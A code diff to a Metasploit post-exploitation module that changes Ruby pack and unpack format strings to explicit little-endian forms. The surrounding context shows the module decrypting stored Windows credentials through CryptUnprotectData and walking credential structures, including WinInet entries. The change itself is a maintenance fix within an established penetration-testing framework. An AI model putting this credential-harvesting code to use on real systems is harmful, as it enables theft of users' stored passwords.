@@ -41,7 +41,7 @@ class Metasploit3 < Msf::Post
     if is_86
       addr = [data].pack("V")
     else
-      addr = [data].pack("Q")
+      addr = [data].pack("Q<")
     end
     return addr
   end
@@ -85,7 +85,7 @@ class Metasploit3 < Msf::Post
     entropy.each_byte do |c|
       salt << c
     end
-    ent = salt.pack("s*")
+    ent = salt.pack("v*")
 
     #save values to memory and pack addresses
     mem = mem_write(data, 1024)
@@ -118,7 +118,7 @@ class Metasploit3 < Msf::Post
     guid.each_byte do |c|
       salt << c*4
     end
-    ent = salt.pack("s*")
+    ent = salt.pack("v*")
 
     #write entropy to memory and pack addresses
     mem = mem_write(ent,1024)
@@ -133,7 +133,7 @@ class Metasploit3 < Msf::Post
       len,add = ret["pDataOut"].unpack("V2")
     else
       ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,0,16)
-      len,add = ret["pDataOut"].unpack("Q2")
+      len,add = ret["pDataOut"].unpack("Q<2")
     end
 
     #get data, and return it
@@ -356,13 +356,13 @@ class Metasploit3 < Msf::Post
     #read array of addresses as pointers to each structure
     raw = read_str(p_to_arr[0], arr_len,2)
     pcred_array = raw.unpack("V*") if is_86
-    pcred_array = raw.unpack("Q*") unless is_86
+    pcred_array = raw.unpack("Q<*") unless is_86
 
     #loop through the addresses and read each credential structure
     pcred_array.each do |pcred|
       raw = read_str(pcred, 52,2)
-      cred_struct = raw.unpack("VVVVQVVVVVVV") if is_86
-      cred_struct = raw.unpack("VVQQQQQVVQQQ") unless is_86
+      cred_struct = raw.unpack("VVVVQ<VVVVVVV") if is_86
+      cred_struct = raw.unpack("VVQ<Q<Q<Q<Q<VVQ<Q<Q<") unless is_86
 
       location = read_str(cred_struct[2],512, 1)
       if location.include? "Microsoft_WinInet"
